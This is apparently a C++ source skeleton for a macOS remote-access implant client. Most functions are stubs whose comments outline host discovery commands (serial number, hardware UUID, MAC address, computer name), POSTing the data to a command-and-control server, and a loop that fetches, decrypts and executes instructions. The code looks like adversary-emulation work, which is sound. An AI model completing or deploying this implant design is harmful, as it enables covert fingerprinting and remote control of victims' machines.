#include "ClientPP.hpp"

bool ClientPP::osInfo (int dwRandomTimeSleep) {
    // if parameters are populated, just return true

    // otherwise, perform discovery actions, send to C2 server, return true
    //      ClientPP::createClientID()
    //      getpwuid() > pw_name - https://pubs.opengroup.org/onlinepubs/009604499/functions/getpwuid.html
    //      scutil --get ComputerName
    //      uname -m
    //      system_profiler SPHardwareDataType 2>/dev/null | awk ...
    //      send POST request with data to C2
    
    // return false on any issues or errors
    return true;
}

void ClientPP::runClient(int dwRandomTimeSleep) {
    // heartbeat - send HTTP GET request to server
    // receive and decrypt instructions
    // execute instructions
    // encrypt instructions
    // return output - send HTTP POST request to server
    return;
}

int8_t ClientPP::createClientID() {
    int8_t id[24];

    //  serial number - ioreg -rdl -c IOPlatformExpertDevice | awk '/IOPlatformSerialNumber/ {split ($0, line, "\""); printf("%s", line[4]); }'
    //  hardware UUID - ioreg -rdl -c IOPlatformExpertDevice | awk '/IOPlatformUUID/ {split ($0, line, "\""); printf("%s", line[4]); }'
    //  mac address - ifconfig en0 | awk '/ether/{print $2}'
    //  randomly generated UUID - uuidgen

    return *id;
}

void ClientPP::performHTTPRequest(std::string type, std::vector<unsigned char> data) {
    // should call the CommsLib exported function that generates the HTTP request
    // should return the data type returned by the CommsLib exported function
}